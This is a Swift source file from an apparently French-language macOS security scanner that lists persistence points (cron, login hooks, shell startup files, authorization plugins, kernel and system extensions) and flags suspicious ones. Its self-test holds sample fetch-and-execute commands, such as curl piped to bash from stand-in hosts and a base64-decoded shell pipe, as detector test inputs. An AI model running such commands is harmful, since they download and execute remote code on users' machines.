import Foundation

/// Somewhere other than launchd where a program can make itself start again: apps opened at login, cron, login hooks,
/// shell startup files, authorization plugins, kernel and system extensions (what KnockKnock lists).
struct ProtectionAnchor: Identifiable, Hashable {
    enum Kind: String, CaseIterable {
        case loginItem, cron, loginHook, shell, authorization, scriptingAddition, kernelExtension, systemExtension

        var title: String {
            switch self {
            case .loginItem: return "Ouvert à la connexion"
            case .cron: return "Tâches cron"
            case .loginHook: return "Scripts de connexion"
            case .shell: return "Démarrage du Terminal"
            case .authorization: return "Modules d'authentification"
            case .scriptingAddition: return "Ajouts AppleScript"
            case .kernelExtension: return "Extensions du noyau"
            case .systemExtension: return "Extensions système"
            }
        }

        var symbol: String {
            switch self {
            case .loginItem: return "power"
            case .cron: return "clock"
            case .loginHook: return "person.badge.key"
            case .shell: return "terminal"
            case .authorization: return "lock.rectangle.stack"
            case .scriptingAddition: return "applescript"
            case .kernelExtension: return "cpu"
            case .systemExtension: return "puzzlepiece.extension"
            }
        }
    }

    var id: String { kind.rawValue + "|" + name + "|" + (path ?? "") }
    let kind: Kind
    let name: String
    var path: String?
    var detail: String
    var risk: Status
}

enum ProtectionAnchors {
    static let shellFiles = [".zshrc", ".zprofile", ".zshenv", ".zlogin", ".bash_profile", ".bashrc", ".profile"]

    static func scan() -> [ProtectionAnchor] {
        if DemoData.isEnabled { return ProtectionDemo.anchors() }
        var out: [ProtectionAnchor] = []
        out += loginItems()
        // cron: each active line runs on a schedule, forever.
        let cron = Shell.run("/usr/bin/crontab", ["-l"])
        if cron.ok {
            for line in cron.out.split(separator: "\n").map(String.init) where !line.trimmingCharacters(in: .whitespaces).isEmpty && !line.hasPrefix("#") {
                out.append(ProtectionAnchor(kind: .cron, name: String(line.prefix(80)), detail: line,
                                            risk: ProtectionHeuristics.isDownloader(line) ? .bad : .info))
            }
        }
        // Login and logout hooks: an old mechanism, run as root at each login; still used by some malware.
        for (domain, owner) in [("com.apple.loginwindow", "ta session"), ("/Library/Preferences/com.apple.loginwindow", "tous les comptes")] {
            for key in ["LoginHook", "LogoutHook"] {
                let r = Shell.run("/usr/bin/defaults", ["read", domain, key])
                let value = r.out.trimmingCharacters(in: .whitespacesAndNewlines)
                guard r.ok, !value.isEmpty else { continue }
                out.append(ProtectionAnchor(kind: .loginHook, name: key == "LoginHook" ? "À la connexion" : "À la déconnexion", path: value,
                                            detail: "Lancé en administrateur pour \(owner) : \(value)", risk: .warn))
            }
        }
        for name in shellFiles {
            let path = FS.home + "/" + name
            guard let text = try? String(contentsOfFile: path, encoding: .utf8) else { continue }
            for line in ProtectionHeuristics.suspiciousLines(text).prefix(3) {
                out.append(ProtectionAnchor(kind: .shell, name: "~/" + name, path: path,
                                            detail: "Exécuté à chaque Terminal : \(line.prefix(200))", risk: .bad))
            }
        }
        // Authorization plugins run inside the login window, as root: macOS ships its own elsewhere.
        for name in FS.children("/Library/Security/SecurityAgentPlugins") {
            let path = "/Library/Security/SecurityAgentPlugins/" + name
            let sig = Signature.check(path)
            out.append(ProtectionAnchor(kind: .authorization, name: name, path: path,
                                        detail: "Intervient à chaque connexion, avec les droits du système. Signé : \(sig.label).",
                                        risk: sig.isTrusted ? .info : .bad))
        }
        for root in ["/Library/ScriptingAdditions", FS.home + "/Library/ScriptingAdditions"] {
            for name in FS.children(root) {
                let path = root + "/" + name
                let sig = Signature.check(path)
                out.append(ProtectionAnchor(kind: .scriptingAddition, name: name, path: path,
                                            detail: "Chargé par les scripts AppleScript. Signé : \(sig.label).", risk: sig.isTrusted ? .info : .warn))
            }
        }
        for name in FS.children("/Library/Extensions") where name.hasSuffix(".kext") {
            let path = "/Library/Extensions/" + name
            let sig = Signature.check(path)
            out.append(ProtectionAnchor(kind: .kernelExtension, name: (name as NSString).deletingPathExtension, path: path,
                                        detail: "Code chargé dans le noyau de macOS. Signé : \(sig.label).", risk: sig.isTrusted ? .info : .bad))
        }
        out += systemExtensions(Shell.run("/usr/bin/systemextensionsctl", ["list"]).out)
        return out
    }

    /// Apps opened at login and background items, from macOS' own register (Réglages › Général › Ouverture).
    static func loginItems() -> [ProtectionAnchor] {
        let r = Shell.run("/usr/bin/sfltool", ["dumpbtm"], timeout: 15)
        guard r.ok else { return [] }
        // Judged on the app's real signature when it can be read: an unsigned or broken one deserves a look.
        let own = (Bundle.main.bundlePath as NSString).standardizingPath
        return parseBTM(r.out, uid: getuid()).map { a in
            guard let p = a.path.map({ ($0 as NSString).standardizingPath }), FS.exists(p), p != own else { return a }
            var a = a
            let sig = Signature.check(p)
            a.risk = sig.isTrusted ? .info : (sig == .unknown ? .info : .warn)
            if !sig.isTrusted, sig != .unknown { a.detail += " · \(sig.label)" }
            return a
        }
    }

    static func parseBTM(_ text: String, uid: uid_t) -> [ProtectionAnchor] {
        var out: [ProtectionAnchor] = []
        var mine = false
        var item: [String: String] = [:]
        func flush() {
            defer { item = [:] }
            guard mine, let type = item["Type"], type.hasPrefix("app") || type.hasPrefix("login item"),
                  let disposition = item["Disposition"], disposition.contains("enabled"), !disposition.contains("disallowed") else { return }
            let name = item["Name"] ?? "?"
            let url = item["URL"].flatMap { $0 == "(null)" ? nil : $0 }
            let path = url.map { $0.replacingOccurrences(of: "file://", with: "").removingPercentEncoding ?? $0 }
            let developer = item["Developer Name"].flatMap { $0 == "(null)" ? nil : $0 }
            let apple = item["Bundle Identifier"]?.hasPrefix("com.apple.") == true || item["Identifier"]?.contains(".com.apple.") == true
            out.append(ProtectionAnchor(kind: .loginItem, name: name, path: path?.hasPrefix("/") == true ? path : nil,
                                        detail: developer.map { "Par \($0)" } ?? (apple ? "Par Apple" : "Développeur non indiqué"), risk: .info))
        }
        for raw in text.split(separator: "\n") {
            let line = raw.trimmingCharacters(in: .whitespaces)
            if line.hasPrefix("Records for UID") {
                flush()
                mine = line.contains("UID \(uid) ")
            } else if line.hasPrefix("#"), line.hasSuffix(":"), !raw.hasPrefix("    #") {
                flush()
            } else if let colon = line.range(of: ": ") {
                let key = String(line[..<colon.lowerBound])
                if item[key] == nil { item[key] = String(line[colon.upperBound...]) }
            }
        }
        flush()
        var seen = Set<String>()
        return out.filter { seen.insert($0.name + ($0.path ?? "")).inserted }
    }

    /// Third-party system extensions (VPN, content filters, security products): they see the network or the files.
    static func systemExtensions(_ text: String) -> [ProtectionAnchor] {
        var out: [ProtectionAnchor] = []
        for line in text.split(separator: "\n") {
            let cols = line.split(separator: "\t").map { $0.trimmingCharacters(in: .whitespaces) }
            // enabled, active, team ID, bundle ID (version), name, [state]
            guard cols.count >= 6, cols[2].count == 10, cols[2].allSatisfy({ $0.isUppercase || $0.isNumber }) else { continue }
            let id = cols[3].split(separator: " ").first.map(String.init) ?? cols[3]
            guard !out.contains(where: { $0.name == cols[4] }) else { continue }
            let active = cols[1] == "*"
            out.append(ProtectionAnchor(kind: .systemExtension, name: cols[4], path: nil,
                                        detail: "\(id) · \(cols[5].trimmingCharacters(in: CharacterSet(charactersIn: "[]")))\(active ? "" : " · inactive")",
                                        risk: .info))
        }
        return out
    }

    static func selfTest() -> [String] {
        var f: [String] = []
        let btm = """
         Records for UID 0 : X
         #1:
                         Name: Root thing
                         Type: app (0x2)
                  Disposition: [enabled, allowed, notified] (0xb)
         Records for UID 501 : Y
         #1:
                         Name: Lanterne
               Developer Name: Lanterne Software
              Team Identifier: ABCDE12345
                         Type: app (0x2)
                  Disposition: [enabled, allowed, notified] (0xb)
                          URL: file:///Applications/Lanterne.app/
         #2:
                         Name: Off
                         Type: app (0x2)
                  Disposition: [disabled, allowed, notified] (0x2)
        """
        let items = parseBTM(btm, uid: 501)
        if items.map(\.name) != ["Lanterne"] || items.first?.path != "/Applications/Lanterne.app/" { f.append("Lecture des éléments d'ouverture : \(items.map(\.name))") }
        let ext = "1 extension(s)\n--- com.apple.system_extension.network_extension\nenabled\tactive\tteamID\tbundleID (version)\tname\t[state]\n*\t*\tJ6S6Q257EK\tch.protonvpn.mac.WireGuard-Extension (5.1.0/2)\tProtonVPN WireGuard\t[activated enabled]\n"
        if systemExtensions(ext).first?.name != "ProtonVPN WireGuard" { f.append("Lecture des extensions système") }
        if ProtectionHeuristics.suspiciousLines("export PATH=$HOME/bin:$PATH\neval \"$(brew shellenv)\"\nalias ll='ls -la'\n").count != 0 {
            f.append("Ligne ordinaire du .zshrc prise pour une menace")
        }
        if ProtectionHeuristics.suspiciousLines("curl -fsSL https://evil.example/x.sh | bash\n").count != 1 {
            f.append("Téléchargement exécuté dans le .zshrc non repéré")
        }
        for (text, bad) in [("/bin/sh -c curl -s http://x.example/p | sh", true), ("echo aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8= | base64 -d | sh", true),
                            ("/usr/bin/curl -o /tmp/u https://x.example/u && chmod +x /tmp/u && /tmp/u", true),
                            ("/opt/homebrew/bin/brew services start postgresql", false), ("/usr/bin/python3 -m http.server", false),
                            ("curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh -o install.sh", false)]
        where ProtectionHeuristics.isDownloader(text) != bad {
            f.append("Heuristique de téléchargement \(bad ? "muette" : "déclenchée à tort") : \(text.prefix(60))")
        }
        return f
    }
}
